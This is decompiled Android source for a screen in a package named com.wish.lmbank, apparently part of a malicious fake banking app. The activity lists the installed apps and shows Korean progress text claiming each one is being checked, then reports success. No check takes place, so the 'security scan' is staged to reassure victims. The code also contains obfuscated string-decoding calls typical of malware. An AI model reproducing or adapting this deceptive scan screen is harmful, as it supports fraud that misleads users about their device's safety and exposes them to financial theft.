package com.wish.lmbank.activity;

import android.annotation.SuppressLint;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.wish.lmbank.R;
import com.wish.lmbank.R2;
import com.wish.lmbank.base.BaseActivityV;
import com.wish.lmbank.utils.HandlerUtils;

import java.util.List;

import gv00l3ah.mvdt7w.bb7d7pu7;
/* loaded from: cookie_9234504.jar:com/wish/lmbank/activity/ScanningAppActivity.class */
public class ScanningAppActivity extends BaseActivityV {
    private Button btExitApp;
    private ImageView ivAppImage;
    private RelativeLayout rlScanningOngoing;
    private RelativeLayout rlScanningSuccess;
    private TextView tvAppInfo;
    private TextView tvAppPackageName;

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public int initLayoutView() {
        return R2.layout.activity_scanning_app;
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initView() {
        super.initView();
        this.rlScanningSuccess = (RelativeLayout) findViewById(R2.id.rl_scanning_success);
        this.rlScanningOngoing = (RelativeLayout) findViewById(R2.id.rl_scanning_ongoing);
        this.tvAppInfo = (TextView) findViewById(R2.id.tv_app_info);
        this.tvAppPackageName = (TextView) findViewById(R2.id.tv_app_package_name);
        this.btExitApp = (Button) findViewById(R2.id.bt_exit_app);
        this.ivAppImage = (ImageView) findViewById(R2.id.iv_app_image);
        new Thread(new Runnable() { // from class: com.wish.lmbank.activity.ScanningAppActivity.1

            @Override // java.lang.Runnable
            public void run() {
               ScanningAppActivity.this.startScanning();
            }
        }).start();
    }

    @Override // com.wish.lmbank.base.BaseActivityV, com.wish.lmbank.base.BaseFuncIml
    public void initListener() {
        super.initListener();
        this.btExitApp.setOnClickListener(this);
    }

    @Override // com.wish.lmbank.base.BaseActivityV, android.view.View.OnClickListener
    public void onClick(View view) {
        super.onClick(view);
//        2131296389
        if (view.getId() != R.id.cx) {
            return;
        }
        finish();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void startScanning() {
        PackageManager packageManager = getPackageManager();
        List<PackageInfo> installedPackages = packageManager.getInstalledPackages(0);
        for (PackageInfo packageInfo : installedPackages) {
            HandlerUtils.getMainThreadHandler().post(new Runnable() { // from class: com.wish.lmbank.activity.ScanningAppActivity.2
               // final List val$installedPackages;
                //final PackageInfo val$packageInfo;
                //final PackageManager val$packageManager;


                @SuppressLint("SetTextI18n")
                @Override // java.lang.Runnable
                public void run() {
                    TextView textView = ScanningAppActivity.this.tvAppInfo;
//                     textView.setText(bb7d7pu7.m5998("he3NhdDxgvn1SQ") + (installedPackages.size() - 1) + bb7d7pu7.m5998("g9n1hfTxSYX82EmFzfiF_vmF7fVJ") +installedPackages.indexOf(packageInfo) + bb7d7pu7.m5998("gtvhhc7RSYX82IX07UmD2-mF68WFzfiF9-yC4uGC4s0"));
                    textView.setText("설치된 " + (installedPackages.size() - 1) + "개의 앱 중에서 " +installedPackages.indexOf(packageInfo) + "번째 앱을 검사중입니다");
                    ScanningAppActivity.this.tvAppPackageName.setText(packageInfo.packageName);
                    ScanningAppActivity.this.ivAppImage.setImageDrawable(packageInfo.applicationInfo.loadIcon(packageManager));
                    if (installedPackages.indexOf(packageInfo) == installedPackages.size() - 1) {
                        ScanningAppActivity.this.rlScanningSuccess.setVisibility(View.VISIBLE);
                        ScanningAppActivity.this.rlScanningOngoing.setVisibility(View.GONE);
                    }
                }
            });
            try {
                Thread.sleep(100L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}
